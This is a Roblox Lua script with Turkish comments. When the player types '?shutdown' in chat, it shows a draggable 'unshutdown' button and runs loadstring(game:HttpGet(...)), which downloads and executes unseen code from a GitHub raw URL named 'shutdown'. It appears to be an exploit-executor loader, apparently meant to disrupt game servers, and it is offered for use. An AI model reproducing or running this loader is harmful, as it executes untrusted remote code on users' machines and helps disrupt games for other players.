local player = game.Players.LocalPlayer
local replicatedStorage = game:GetService("ReplicatedStorage")
local sayMessageRequest = replicatedStorage:WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")

local function createGui()
    print("GUI oluşturuluyor...") -- Debug mesajı ekle
    local success, errorMessage = pcall(function()
        local screenGui = Instance.new("ScreenGui")
        screenGui.Name = "ShutdownGui"
        screenGui.Parent = player:WaitForChild("PlayerGui")

        local frame = Instance.new("Frame")
        frame.Size = UDim2.new(0, 200, 0, 100)
        frame.Position = UDim2.new(0.5, -100, 0.5, -50)
        frame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
        frame.BorderSizePixel = 2
        frame.BorderColor3 = Color3.fromRGB(255, 255, 255)
        frame.Active = true -- GUI'nin sürüklenebilir olması için

        local dragInput
        local dragStart
        local startPos

        frame.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                dragStart = input.Position
                startPos = frame.Position
                input.Changed:Connect(function()
                    if input.UserInputState == Enum.UserInputState.End then
                        dragStart = nil
                    end
                end)
            end
        end)

        frame.InputChanged:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
                dragInput = input
            end
        end)

        game:GetService("UserInputService").InputChanged:Connect(function(input)
            if input == dragInput and dragStart then
                local delta = input.Position - dragStart
                frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
            end
        end)

        frame.Parent = screenGui

        local button = Instance.new("TextButton")
        button.Size = UDim2.new(1, 0, 1, 0)
        button.Text = "unshutdown"
        button.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
        button.TextColor3 = Color3.fromRGB(255, 255, 255)
        button.Font = Enum.Font.SourceSans
        button.TextSize = 24
        button.Parent = frame

        button.MouseButton1Click:Connect(function()
            screenGui:Destroy()
            _G.shutdownActive = false
            sayMessageRequest:FireServer("?unping", "All")
        end)
    end)

    if not success then
        warn("GUI oluşturulurken bir hata oluştu: " .. errorMessage)
    end
end

player.Chatted:Connect(function(message)
    if message == "?shutdown" then
        createGui()
        _G.shutdownActive = true
        loadstring(game:HttpGet("https://raw.githubusercontent.com/raisenscripts/Premiumv3/main/shutdown"))()
    end
end)
